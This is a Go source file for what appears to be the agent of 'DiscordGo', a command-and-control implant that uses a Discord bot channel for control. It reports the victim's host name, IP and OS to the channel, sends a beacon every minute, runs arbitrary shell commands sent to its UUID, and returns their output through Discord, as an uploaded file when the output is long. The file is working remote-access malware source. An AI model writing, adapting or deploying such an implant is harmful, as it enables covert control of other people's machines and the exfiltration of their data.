package main

import (
	// "bufio"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"

	"DiscordGo/pkg/agent"
	"DiscordGo/pkg/message"
	"DiscordGo/pkg/util"
	"DiscordGo/pkg/util/constants"

	"github.com/bwmarrin/discordgo"
)


var newAgent *agent.Agent

// Create an Agent 
func init(){
	newAgent = &agent.Agent{}
	newAgent.UUID = util.GenerateUUID()
	newAgent.HostName, _ = os.Hostname()
	newAgent.IP = util.GetLocalIP()

	sys := "Unknown"
	if runtime.GOOS == "windows"{
		sys = "Windows"
	} else if runtime.GOOS == "linux"{
		sys = "Linux"
	} else if runtime.GOOS == "darwin" {
		sys = "MacOS"
	}

	newAgent.OS = sys
}

func main(){
	dg, err := discordgo.New("Bot " + constants.BotToken)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	fmt.Println("New Agent Info")
	fmt.Println(newAgent.HostName)
	fmt.Println(newAgent.UUID)
	fmt.Println(newAgent.IP)
	fmt.Println(newAgent.OS)
	fmt.Println()

	firstMessage := newAgent.HostName + ":" + newAgent.IP + ":" + newAgent.OS
	sendMessage := message.NewMessage(newAgent.UUID, firstMessage, false, false, message.MESSAGE_NEW);
	dg.ChannelMessageSend(constants.ChannelID, sendMessage)

	// Register the messageCreate func as a callback for MessageCreate events.
	dg.AddHandler(messageCreator)

	// TODO: Reconnect back to server 
	// ping the server every minute for now (not my solution)
	pulseDelay := time.Duration(60)
	tick := time.NewTicker(time.Second * pulseDelay)
	go heartbeat(dg, tick)

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	// Wait here until CTRL-C or other term signal is received.
	fmt.Println("Agent is now running.  Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc


	lastMessage := "[-] Agent " + newAgent.UUID + " has disconnected"
	sendLMessage := message.NewMessage(newAgent.UUID, lastMessage, false, false, message.MESSAGE_DISCONNECT)
	dg.ChannelMessageSend(constants.ChannelID, sendLMessage)

	// Cleanly close down the Discord session.
	dg.Close()

}

func messageCreator(dg *discordgo.Session, m *discordgo.MessageCreate){

	var messageJSON message.Message
	json.Unmarshal([]byte(m.Content), &messageJSON)

	// TODO: make a gloabl message shit

	// Check if the message is for me
	forMe := false

	if messageJSON.AgentID == newAgent.UUID {
		forMe = true
	}


	if forMe {
		if messageJSON.MessageType == message.MESSAGE_COMMAND {
			result := executeCommand(messageJSON.Message)
			
			// if the result is more than discord character limit
			if len(result) > 2000 {
				// Testing sending files
				// file, _ := os.Open("/tmp/readline.tmp")
				// Doing this for the server
				sendLMessage := message.NewMessage(newAgent.UUID, "", false, true, message.MESSAGE_OUTPUT)
				dg.ChannelMessageSend(constants.ChannelID, sendLMessage)

				testfile := strings.NewReader(result)
				dg.ChannelFileSend(constants.ChannelID, "hh.txt", testfile)

			}else{
				sendMessage := message.NewMessage(newAgent.UUID, result, false, false, message.MESSAGE_OUTPUT)
				dg.ChannelMessageSend(constants.ChannelID, sendMessage) 
			}
		} else if messageJSON.MessageType == message.MESSAGE_PING {
			message.Pong(dg, newAgent.UUID, false)
			// dg.ChannelMessageSend(constants.ChannelID, sendMessage)
			fmt.Println("Pong")
		} else if messageJSON.MessageType == message.MESSAGE_KILL {
			sendLMessage := message.NewMessage(newAgent.UUID, "", false, false, message.MESSAGE_DISCONNECT)
			dg.ChannelMessageSend(constants.ChannelID, sendLMessage)
			
			// Exit peacefully
			dg.Close()
			os.Exit(0)
		}
	}
}

// THIS IS A REALLY STUPID WAY TO DO HEARTBEAT
// BUT WHATEVER, IT'S MY CODE
// i hope I don't regret this(I probably will)
// WOOOW, it's like tcp handshake(I just noticed that)
func heartBeat(dg *discordgo.Session) {
	//agent --> I'm alive
	agentPing := message.NewMessage(newAgent.UUID, "alive", false, false, message.MESSAGE_PING)
	dg.ChannelMessageSend(constants.ChannelID, agentPing)
	// server <--- I see you
	// agent --> okay
	//=======^ if server is up
	//agent --> I'm alive
	// server <---- N/A
	// agent --> keeps trying
	// ping the server every minute for now
	// pulseDelay := time.Duration(60)
	// tick := time.NewTicker(time.Second * pulseDelay)
	// go heartbeat(dg, tick)
	// go heartBeat()

}

func heartbeat(dg *discordgo.Session, tick *time.Ticker) {
	for t := range tick.C {
		pingTheServer(dg, t)
	}
}

// Attempt to ping the server to let them know we are still alive and kicking. This will (in theory) remain persistent even if the server resets etc
func pingTheServer(dg *discordgo.Session, t time.Time) {
	// build our message to send to the server
	newMessage := message.NewMessage(newAgent.UUID,"Ping at: "+t.String(), false, false, message.MESSAGE_PING)
	dg.ChannelMessageSend(constants.ChannelID, newMessage)

}

func executeCommand(command string) string{
	fmt.Println("Received command: " + command)

	args := ""
	result := ""

	// Seperate args from command
	ss := strings.Split(command, " ")
	command = ss[0]
	fmt.Println(len(ss))
	fmt.Println(command)

	if len(ss) > 1{
		for i := 1; i < len(ss); i++ {
			args += ss[i] + " "
		}
		args = args[:len(args)-1] // I HATEEEEEEEE GOLANGGGGGG
	}

	fmt.Println("Args: " + args)

	if args == "" {
		output, err := exec.Command(command).Output()
		if err != nil {
			// maybe send error to server
			fmt.Println(err.Error())
			fmt.Println("Couldn't execute command")
		}
	
		result = string(output)
		fmt.Println("Result: " + result)

		fmt.Println(len(result))
	} else{
		output, err := exec.Command(command, args).Output()
		if err != nil {
			// maybe send error to server
			fmt.Println(err.Error())
			fmt.Println("Couldn't execute command")
		}

		result = string(output)
		fmt.Println("Result: " + result)
	}
	return result
}


